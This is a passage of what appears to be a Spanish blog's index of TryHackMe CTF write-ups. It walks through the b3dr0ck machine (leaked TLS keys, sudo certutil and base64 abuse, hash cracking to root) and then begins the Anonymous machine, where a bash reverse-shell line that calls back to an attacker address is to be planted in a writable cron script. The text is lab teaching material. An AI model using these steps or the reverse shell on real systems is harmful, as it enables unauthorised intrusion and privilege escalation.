que tenemos tres puertos abiertos: 22/tcp con un servicio ssh escuchando 2222/tcp también con ssh escuchando 31337/tcp con algo llamado Elite del otro lado (?)Sobre éste último puerto, el propio nmap nos dice que se trata de “un servicio no reconocido a pesar de devolver datos …“  y que si sabemos de qué se trata les enviémos la huella correspondiente.31337/tcp ? … Elite ? … la costumbre y la curiosidad me llevaron a emprender un par de búsquedas en Google para arrojar algo de luz sobre el asunto, buen hábito que os recomiendo (nunca es mal momento para adquirir nuevos conocimientos y hay información interesante asociada a este puerto como por ejemplo aquí) si bien en este caso, y perdonarme el spoiler … la cosa no iba por ahí.Leyendo con atención la salida asociada a este puerto vemos un dato interesante:| In case I forget - user:pass|_ &lt;REDACTADO&gt;:&lt;REDACTADO&gt;De verdad !? … un juego de credenciales como salida de un servicio misterioso ??Siguiendo el consejo del autor, conectamos con netcat contra la IP y el puerto para confirmar.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/IntermediateNmap]└─$ nc 10.10.227.18 31337 In case I forget - user:pass&lt;REDACTADO&gt;:&lt;REDACTADO&gt;Pues toca probar. Lo intentamos vía ssh empezando por el 22/tcp (recordar que tenemos 2 puertos con ssh abiertos).┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/IntermediateNmap]└─$ ssh &lt;REDACTADO&gt;@10.10.227.18&lt;REDACTADO&gt;@10.10.227.18's password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1014-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantageThis system has been minimized by removing packages and content that arenot required on a system that users do not log into.To restore this content, you can run the 'unminimize' command.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.$ pwd/home/&lt;REDACTADO&gt;$ whoami&lt;REDACTADO&gt;$ ls -latotal 28drwxr-xr-x 1 &lt;REDACTADO&gt; &lt;REDACTADO&gt; 4096 Sep 19 14:05 .drwxr-xr-x 1 root root 4096 Mar 2 2022 ..-rw-r--r-- 1 &lt;REDACTADO&gt; &lt;REDACTADO&gt; 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 &lt;REDACTADO&gt; &lt;REDACTADO&gt; 3771 Feb 25 2020 .bashrcdrwx------ 2 &lt;REDACTADO&gt; &lt;REDACTADO&gt; 4096 Sep 19 14:05 .cache-rw-r--r-- 1 &lt;REDACTADO&gt; &lt;REDACTADO&gt; 807 Feb 25 2020 .profile$ cd ..$ ls -latotal 20drwxr-xr-x 1 root root 4096 Mar 2 2022 .drwxr-xr-x 1 root root 4096 Mar 2 2022 ..drwxr-xr-x 1 &lt;REDACTADO&gt; &lt;REDACTADO&gt; 4096 Sep 19 14:05 &lt;REDACTADO&gt;drwxr-xr-x 2 root root 4096 Mar 2 2022 user$ cd user$ ls -latotal 16drwxr-xr-x 2 root root 4096 Mar 2 2022 .drwxr-xr-x 1 root root 4096 Mar 2 2022 ..-rw-rw-r-- 1 root root 38 Mar 2 2022 flag.txt$ cat flag.txtflag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}Máquina resuelta.Espero que os haya servido de ayuda.Saludos he intentar ser felices." }, { "title": "Try Hack Me - b3dr0ck - Writeup", "url": "/posts/thm-writeup-b3dr0ck/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-09-08 02:30:00 +0100", "snippet": "En esta guía vamos a trabajar con la máquina b3dr0ck disponible en THM, un sencillo CTF creado por F11snipe en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utilización de algunas herramientas online para codificación y crakeo, entre otras curiosidades.Dentro música.InicioPara empezar, echamos un ojo a la descripción que aparece en el room:Fred Flintstone &amp; Barney Rubble!Barney está configurando el servidor web ABC tratando de utilizar los certificados TLS para asegurar las conexiones, pero está teniendo problemas. Esto es lo que sabemos… Fue capaz de configurar nginx en el puerto 80, redirigiendo a un servidor web TLS personalizado en el puerto 4040. Hay un socket TCP escuchando con un servicio que permite recuperar los archivos de credenciales TLS (clave y certificado del cliente). Hay otro servicio TCP (TLS) escuchando para las conexiones autorizadas utilizando los archivos obtenidos del servicio anterior.OK, nos dicen que tenemos un servidor escuchando en el tcp/80 que redirige al tcp/4040 y dos servicios en puertos a descubrir.En términos de usuarios, podemos sospechar que estan Fred y Barney.EnumeraciónArrancamos con nmap a ver qué encontramos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]└─$ nmap -sC -sV -p- 10.10.40.42 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 16:42 CESTNmap scan report for 10.10.40.42Host is up (0.036s latency).Not shown: 65530 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)| 256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)|_ 256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to https://10.10.40.42:4040/|_http-server-header: nginx/1.18.0 (Ubuntu)4040/tcp open ssl/yo-main?| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Content-type: text/html| Date: Thu, 08 Sep 2022 14:46:31 GMT| Connection: close| &lt;!DOCTYPE html&gt;| &lt;html&gt;| &lt;head&gt;| &lt;title&gt;ABC&lt;/title&gt;| &lt;style&gt;| body {| width: 35em;| margin: 0 auto;| font-family: Tahoma, Verdana, Arial, sans-serif;| &lt;/style&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;Welcome to ABC!&lt;/h1&gt;| &lt;p&gt;Abbadabba Broadcasting Compandy&lt;/p&gt;[...]|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost| Not valid before: 2022-09-08T14:40:55|_Not valid after: 2023-09-08T14:40:55| tls-alpn: |_ http/1.19009/tcp open pichat?| fingerprint-strings: | NULL: | ____ _____ | \\x20\\x20 / / | | | | /\\x20 | _ \\x20/ ____|| \\x20\\x20 /\\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \\x20 | |_) | | | \\x20/ / / _ \\x20|/ __/ _ \\| '_ ` _ \\x20/ _ \\x20| __/ _ \\x20 / /\\x20\\x20| _ &lt;| | | \\x20 /\\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \\| |_) | |____ | ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____||_ What are you looking for?54321/tcp open ssl/unknown| ssl-cert: Subject: commonName=localhost| Not valid before: 2022-09-08T14:40:55|_Not valid after: 2023-09-08T14:40:55|_ssl-date: TLS randomness does not represent time2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port4040-TCP:V=7.92%T=SSL%I=7%D=9/8%Time=631A0048%P=x86_64-pc-linux-gnuSF:%r(GetRequest,3BE,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/htmlSF:\\r\\nDate:\\x20Thu,\\x2008\\x20Sep\\x202022\\x2014:46:31\\x20GMT\\r\\nConnectionSF::\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\[...]Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 383.97 secondsSignificado de las flags: -sC : devuelve información sobre la versión de los servicios corriendo en los puertos abiertos. -sV : realiza un escaneo utilizando el conjunto de scripts por defecto de nmap. -p- : escanea los 65535 puertos. -oN : imprime la salida en un fichero de texto con el nombre nmap_outputEl volcado de nmap nos cuenta que tenemos cinco puertos abiertos: 22/tcp con un servicio ssh escuchando 80/tcp con un nginx 1.18.0 escuchando 4040/tcp el puerto al que redirige el anterior, con un servicio SSL escuchando 9009/tcp con un servicio pichat corriendo (?) 54321/tcp con otro servicio SSL escuchandoCargamos la IP del room en el browser http://10.10.40.42. Nos redirige a https://10.10.40.42:4040 y nos da un Warning por el certificado. Aceptamos los riesgos.Nos carga un vista con el siguiente texto.Todo muy bonito pero muy poco con lo que poder avanzar más allá de cierta confirmación sobre la existencia del usuario Barney.Retomando lo que nos indicaban en la descripción del room sabemos que hay un socket TCP escuchando con un servicio que nos ayudará a recuperar los archivos de credenciales TLS/SSL. Qué es un Socket y para qué sirve: Cuando dos procesos que están en hosts diferentes (ordenadores, smartphones o cualquier dispositivo conectado a una red) quieren intercambiar información a través de dicha red (sea ésta local o Internet) es necesario que abran un socket (TCP o UDP) para establecer la comunicación e intercambiar datos. Todas las comunicaciones entre dos o más hosts se realizan a nivel de la Capa de Transporte (capa 4 del modelo OSI / capa 3 en el modelo TCP/IP), que es la primera capa donde hay una comunicación punto a punto entre dos o más equipos.A partir el volcado de nmap los candidatos son el 9009/tcp y el 54321/tcp.Probamos con el 9009/tcp.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]└─$ nc 10.10.40.42 9009 __ __ _ _ ____ _____ \\ \\ / / | | | | /\\ | _ \\ / ____| \\ \\ /\\ / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \\ | |_) | | \\ \\/ \\/ / _ \\ |/ __/ _ \\| '_ ` _ \\ / _ \\ | __/ _ \\ / /\\ \\ | _ &lt;| | \\ /\\ / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \\| |_) | |____ \\/ \\/ \\___|_|\\___\\___/|_| |_| |_|\\___| \\__\\___/ /_/ \\_\\____/ \\_____|What are you looking for? helpLooks like the secure login service is running on port: 54321Try connecting using:socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0What are you looking for?Bien. En el puerto 9009/tcp efectivamente esta corriendo el servicio que permite recuperar los archivos de credenciales TLS (clave y certificado del cliente); y en el 54321/tcp nos confirman que esta activo el secure login service, el servicio que soporta las conexiones autorizadas utilizando los archivos obtenidos mediante éste. También nos indican cómo debemos conectarnos al servicio de login utilizando socat.socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0Probamos a obtener los archivos de credenciales.What are you looking for? certSounds like you forgot your certificate. Let's find it for you...-----BEGIN CERTIFICATE-----MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yMjA5MDgxNDQxMDhaFw0yMzA5MDgxNDQxMDhaMBgxFjAUBgNVBAMMDUJhcm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDxK/4/[...]+IDCFi9RDrG016HRQ19mqIzdgz4yfggneQpgIN424r4+ZAziusSzPTRUXlfTUjDMM8uAgM7JYLBE75+uCnIu3n1cbcziBa4R8X4ax+cQdRmCyArsveH43KSplVUUF+UwZ9wlbTI=-----END CERTIFICATE-----What are you looking for? keySounds like you forgot your private key. Let's find it for you...-----BEGIN RSA PRIVATE KEY-----MIIEpQIBAAKCAQEA8Sv+P0pngoe7EWgnmV3P2hoym3sN9Tc7KSXKreOnVz6MHavob/hzS7lNwc6D+q/rR0KUVSiW5Y5luGUCIf3C54AnbeaI1auajXGVkXuVyaAUTaeQ57lHDcv9bH7Ss8dL+HhCRB1tBNxGxhD+rX1goHne18vgByTAEw9LgJO0ZVtdbdHR[...]Vo1xDhcCgYEAyrmN49C6gn5Rx7E6RHV+D4dio/xdmt4zYK3M6SUMIMqO7DdOkcshebD1SOBGilbjDmKdv8jKu/vAvLYEIs7zXsIFH/d6xqvpJFEqAVrByuXsF69ts9fl2q4we74ej2L8zl/LHkVj7xhnxfjYQ81swNPq6KfXUMxfSjHh1U3nQ6U=-----END RSA PRIVATE KEY-----What are you looking for?Copiamos el Certificado TLS y la Clave Privada en sendos ficheros con el nombre cert.pem   y key.pem respectivamente. Una vez tenemos ambos ficheros creados en nuestro directorio de trabajo, y tal como nos sugieren, utilizamos socat para conectarnos al servicio de login disponible en el puerto 54321/tcp. Socat es una utilidad de red basada en línea de comandos que posibilita la transferencia bidireccional de datos entre dos canales de datos independientes. Se la considera la versión avanzada de netcat pues si bien hacen cosas similares, socat cuenta con varias funciones adicionales.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]└─$ socat stdio ssl:10.10.40.42:54321,cert=cert.pem,key=key.pem,verify=0 __ __ _ _ _____ _ _ _____ _ \\ \\ / / | | | | | __ \\ | | | | | __ \\ | | \\ \\_/ /_ _| |__ | |__ __ _ | | | | __ _| |__ | |__ __ _ | | | | ___ | | \\ / _` | '_ \\| '_ \\ / _` | | | | |/ _` | '_ \\| '_ \\ / _` | | | | |/ _ \\| | | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_| |_|\\__,_|_.__/|_.__/ \\__,_| |_____/ \\__,_|_.__/|_.__/ \\__,_| |_____/ \\___/(_)Welcome: 'Barney Rubble' is authorized.b3dr0ck&gt; lsUnrecognized command: 'ls'This service is for login and password hintsb3dr0ck&gt; helpPassword hint: d1ad7c0[...]4180dd (user = 'Barney Rubble')b3dr0ck&gt;OK, tenemos la contraseña del usuario barney. Tiramos del ssh que tenemos disponible en el puerto 22/tcp para conectarnos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]└─$ ssh barney@10.10.40.42The authenticity of host '10.10.40.42 (10.10.40.42)' can't be established.ED25519 key fingerprint is SHA256:CFTFQcdE19Y7z0z2H7f+gsTTUaLOiPE1gtFt0egy/V8.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.40.42' (ED25519) to the list of known hosts.barney@10.10.40.42's password:barney@b3dr0ck:~$ pwd/home/barneybarney@b3dr0ck:~$ lsbarney.txtbarney@b3dr0ck:~$ cat barney.txtTHM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}barney@b3dr0ck:~$Tenemos la primer flag correspondiente al usuario barney. Seguimos.barney@b3dr0ck:~$ cd ..barney@b3dr0ck:/home$ lsbarney fredbarney@b3dr0ck:/home$ cd fredbarney@b3dr0ck:/home/fred$ lsfred.txtbarney@b3dr0ck:/home/fred$ cat fred.txtcat: fred.txt: Permission deniedbarney@b3dr0ck:/home/fred$Necesitamos hacer un escalado de privilegios horizonal.Escalado de privilegios horizonalVeamos qué binarios puede ejecutar barney con privilegios de root.barney@b3dr0ck:/home/fred$ cd ..barney@b3dr0ck:/home$ sudo -l[sudo] password for barney:Matching Defaults entries for barney on b3dr0ck: insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser barney may run the following commands on b3dr0ck: (ALL : ALL) /usr/bin/certutilbarney@b3dr0ck:/home$Tenemos disponible el binario certutil. certutil es una utilidad de línea de comandos que puede crear y modificar bases de datos de certificados y claves. En concreto, puede enumerar, generar, modificar o eliminar certificados, crear o cambiar la contraseña, generar nuevos pares de claves públicas y privadas, mostrar el contenido de la base de datos de claves o eliminar pares de claves dentro de la base de datos de claves. fuenteEstupendo. Vamos con ello.barney@b3dr0ck:/home$ sudo certutilCert Tool Usage:----------------Show current certs: certutil lsGenerate new keypair: certutil [username] [fullname]Según lo anterior, podemos listar y generar certificados.barney@b3dr0ck:/home$ sudo certutil lsCurrent Cert List: (/usr/share/abc/certs)------------------total 56drwxrwxr-x 2 root root 4096 Apr 30 21:54 .drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..-rw-r----- 1 root root 972 Sep 8 14:41 barney.certificate.pem-rw-r----- 1 root root 1678 Sep 8 14:41 barney.clientKey.pem-rw-r----- 1 root root 894 Sep 8 14:41 barney.csr.pem-rw-r----- 1 root root 1678 Sep 8 14:41 barney.serviceKey.pem-rw-r----- 1 root root 976 Sep 8 14:41 fred.certificate.pem-rw-r----- 1 root root 1678 Sep 8 14:41 fred.clientKey.pem-rw-r----- 1 root root 898 Sep 8 14:41 fred.csr.pem-rw-r----- 1 root root 1678 Sep 8 14:41 fred.serviceKey.pembarney@b3dr0ck:/home$Bien. Según el listado anterior tenemos acceso al certificado y la clave del usuario fred. Vamos a hacernos con ello.barney@b3dr0ck:/home$ sudo certutil cat /usr/share/abc/certs/fred.certificate.pemGenerating credentials for user: cat (usrshareabccertsfredcertificatepem)Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pemGenerated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAuL8GCdbmIn6vOA6HG6lk6kh/ONUQstPekZtleyGC4MLQM7JydL2xnf/3OiG3I8Mpg7SCr7Q7lnZjCXx0vedjFHk+15WYaP4H2Fs5VtJ75w0pfu+9F/b8PIZpxligz5uWDRKaCogQR9n8wGSgFnd6Sav9G83a6FrBRt4XtxgdbnDy2/DZ[...]PrcccQKBgH9PfBEuZ6f3zibRkFbqbc/KzV1vOtqsVUVfVIW8Lspiou0eg34aQ0fOoFqGU2ikKsrL7eAYHBpdrYuqH950xgkwXJZJT/OP6Zt4yDDNGTHXJtJ3RjLhygqmfcBaHqct5fauNjmCK7eu/wG4esPi7C2oygFcTWqtcqAxH+vwoWvh-----END RSA PRIVATE KEY----------BEGIN CERTIFICATE-----MIICtjCCAZ4CAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yMjA5MDgxNTI2MThaFw0yMjA5MDkxNTI2MThaMC0xKzApBgNVBAMMInVzcnNoYXJlYWJjY2VydHNmcmVkY2VydGlmaWNhdGVwZW0wggEiMA0GCSqGSIb3DQEB[...]J6dVlXfg2PaJABcXUQsU35a5Ne+SF9e5FliPAYG4750sfLB8VGVfZ9JBvyGJ2zLJkyRczMI9Z+8lQO/rt6WmwYIBNhChGhkv0+5xNQt1aIxV2xhz27oGBS32GqKGYMeksDYWHwJVvLHGPEMoaeQ4+mFlIHlsaE6p6g8=-----END CERTIFICATE-----barney@b3dr0ck:/home$Como hemos hecho con el usuario barney, copiamos la clave y el certificado de fred y creamos con ellos los ficheros fred.key.pem   y fred.cert.pem respectivamente.Volvemos a tirar de socat y el servicio de login corriendo en el puerto 54321/tcp para hacernos con la contraseña de fred.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]└─$ socat stdio ssl:10.10.40.42:54321,cert=fred.cert.pem,key=fred.key.pem,verify=0 __ __ _ _ _____ _ _ _____ _ \\ \\ / / | | | | | __ \\ | | | | | __ \\ | | \\ \\_/ /_ _| |__ | |__ __ _ | | | | __ _| |__ | |__ __ _ | | | | ___ | | \\ / _` | '_ \\| '_ \\ / _` | | | | |/ _` | '_ \\| '_ \\ / _` | | | | |/ _ \\| | | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_| |_|\\__,_|_.__/|_.__/ \\__,_| |_____/ \\__,_|_.__/|_.__/ \\__,_| |_____/ \\___/(_)Welcome: 'usrshareabccertsfredcertificatepem' is authorized.b3dr0ck&gt; lsUnrecognized command: 'ls'This service is for login and password hintsb3dr0ck&gt; helpPassword hint: Yab[...]00! (user = 'usrshareabccertsfredcertificatepem')b3dr0ck&gt;Conectamos por ssh.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]└─$ ssh fred@10.10.40.42fred@10.10.40.42's password:fred@b3dr0ck:~$ lsfred.txtfred@b3dr0ck:~$ cat fred.txtTHM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}fred@b3dr0ck:~$Obtenemos la flag correspondiente al usuario fred. Como ya hemos hecho con barney, buscamos los binarios disponibles para este segundo usuario.fred@b3dr0ck:~$ sudo -lMatching Defaults entries for fred on b3dr0ck: insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser fred may run the following commands on b3dr0ck: (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txtfred@b3dr0ck:~$Bien. Según ésto, fred puede ejecutar sin que nos solicite contraseña los binarios /usr/bin/base32  y /usr/bin/base64  sobre el fichero pass.txt  ubicado en el directorio /root .Vamos a ello.Escalado de privilegios verticalAprovechando lo anterior, codificamos y decodificamos el contenido del fichero para hacernos con su contenido:fred@b3dr0ck:~$fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decodeLFKEC52ZKRC[...]CWNBGXURTLJZKFSSYKfred@b3dr0ck:~$OK. Con la operación anterior hemos obtenido una cadena que no sabemos muy bien qué es. Tiramos del servicio online Cyberchef para que nos eche una mano.Para ello, copiamos la cadena que hemos obtenido en el campo Input.Automaticamente se nos completa el campo Output y se nos habilita la opción de la varita mágicaSi nos posicionamos con el ratón sobre el ícono de la varita, Cyberchef nos cuenta lo siguiente:Según Cyberchef, la cadena que tenemos ha sido codificada varias veces. Le damos a la varita.OK, ahora tenemos un hash que podemos crakear utilizando otra herramienta online, en este caso, Crackstation. Vamos a ello.Si todo ha ido bien, nos hemos hecho con la contraseña del usuario root.Volvemos al terminal que tenemos abierto con la sesión del usuario fred.fred@b3dr0ck:~$fred@b3dr0ck:~$ suPassword:root@b3dr0ck:/home/fred# cd /rootroot@b3dr0ck:~# lspass.txt root.txt snaproot@b3dr0ck:~# cat root.txtTHM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}root@b3dr0ck:~#Misión cumplida.Espero que os haya servido de ayuda.Saludos he intentar ser felices." }, { "title": "Try Hack Me - Anonymous - Writeup", "url": "/posts/thm-writeup-anonymous/", "categories": "Try Hack Me", "tags": "thm, writeups", "date": "2022-08-16 12:30:00 +0100", "snippet": "En esta guía vamos a trabajar con la máquina Anonymous disponible en THM, un CTF de dificultad media creado por Nameless0ne en el que pondremos en práctica técnicas de enumeración y escalado de privilegios entre otras curiosidades.Dentro música.Inicio Disclaimer: algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.┌──(ewan67㉿kali)-[~]└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpnIniciamos la máquina remota dando al botón  Start MachineAbrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:┌──(ewan67㉿kali)-[~]└─$ cd Cybersecurity/THM┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ mkdir Anonymous┌──(ewan67㉿kali)-[~/Cybersecurity/THM]└─$ cd Anonymous┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ touch notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ echo \"Notas Anonymous\" &gt; notas┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ cat notasNotas AnonymousReconocimiento &amp; EnumeraciónEmpezamos enumerando el server con nmap.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ nmap -A 10.10.139.26 -oN nmap_outputStarting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 23:23 CESTNmap scan report for 10.10.139.26Host is up (0.074s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable]| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.18.xx.xx| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)| 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)|_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 0s, deviation: 1s, median: 0s| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2022-08-16T21:23:24|_ start_date: N/A| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: anonymous| NetBIOS computer name: ANONYMOUS\\x00| Domain name: \\x00| FQDN: anonymous|_ System time: 2022-08-16T21:23:24+00:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 23.20 secondsSignificado de las flags: -A : escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute) -oN : imprime la salida en un fichero de texto con el nombre nmap_outputnmap nos cuenta que tenemos 4 puertos abiertos: 21/tcp: con un servicio ftp soportado por vsftpd 2.0.8 or later y con Anonymous FTP login allowed 22/tcp: con un servicio ssh soportado por OpenSSH 7.6p1 Ubuntu 139/tcp: con un servicio netbios-ssn soportado por Samba smbd 3.X - 4.X 445/tcp: con un servicio netbios-ssn soportado por Samba smbd 4.7.6-UbuntuBien. Arrancamos por el ftp a ver qué nos encontramos.┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ ftp 10.10.139.26Connected to 10.10.139.26.220 NamelessOne's FTP Server!Name (10.10.139.26:ewan67): anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||5755|)150 Here comes the directory listing.drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts226 Directory send OK.ftp&gt; cd scripts250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||20542|)150 Here comes the directory listing.-rwxr-xrwx 1 1000 1000 314 Jun 04 2020 clean.sh-rw-rw-r-- 1 1000 1000 1204 Aug 16 21:30 removed_files.log-rw-r--r-- 1 1000 1000 68 May 12 2020 to_do.txt226 Directory send OK.ftp&gt; get clean.shlocal: clean.sh remote: clean.sh229 Entering Extended Passive Mode (|||48372|)150 Opening BINARY mode data connection for clean.sh (314 bytes).100% |*************************************************************************************************************************| 314 325.52 KiB/s 00:00 ETA226 Transfer complete.314 bytes received in 00:00 (6.01 KiB/s)ftp&gt; get removed_files.loglocal: removed_files.log remote: removed_files.log229 Entering Extended Passive Mode (|||65327|)150 Opening BINARY mode data connection for removed_files.log (1204 bytes).100% |*************************************************************************************************************************| 1204 913.58 KiB/s 00:00 ETA226 Transfer complete.1204 bytes received in 00:00 (27.84 KiB/s)ftp&gt; get to_do.txtlocal: to_do.txt remote: to_do.txt229 Entering Extended Passive Mode (|||16320|)150 Opening BINARY mode data connection for to_do.txt (68 bytes).100% |*************************************************************************************************************************| 68 1.16 KiB/s 00:00 ETA226 Transfer complete.68 bytes received in 00:00 (0.67 KiB/s)ftp&gt; exit221 Goodbye.Hemos encontrado un directorio scripts , hemos entrado, listado su contenido y descargado con get &lt;file_name&gt; los ficheros que allí estaban a nuestro directorio de trabajo.Los abrimos en local y les echamos un ojo. clean.sh : es un script para limpiar la carpeta /tmp del servidor. Cada vez que se ejecuta revisa el número de ficheros en el directorio; si es 0, graba un mensaje en removed_files.log ; si no es 0, elimina el fichero y graba un mensaje en removed_files.log. removed_files.log : es el fichero de logs del script anterior. to_do.txt : sin comentarios. La cuestión aquí es saber quién ejecuta clean.sh y cuándo. Será una tarea programada ? De ser así, en el tiempo que llevamos elucubrando, se habrá vuelto a ejecutar ? Nos dará alguna información removed_files.log .Para salir de dudas renombramos el removed_files.log  que nos descargamos┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ mv removed_files.log removed_files2.logVolvemos a descargarlo desde el FTP y contamos las lineas de cada uno┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ cat cat removed_files2.log | wc -l28┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]└─$ cat cat removed_files.log | wc -l50OK. El script clean.sh  está asociado a una tarea programada. Si modificamos el contenido del fichero, lo subimos via FTP y esperamos a que se ejecute, estaremos ejecutando nuestro código en el servidor. Por ejemplo: una reverse shellcode para que se conecte a nuestro equipo.Googleamos y encontramos lo que estamos buscando aquíbash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1Modificamos el contenido de 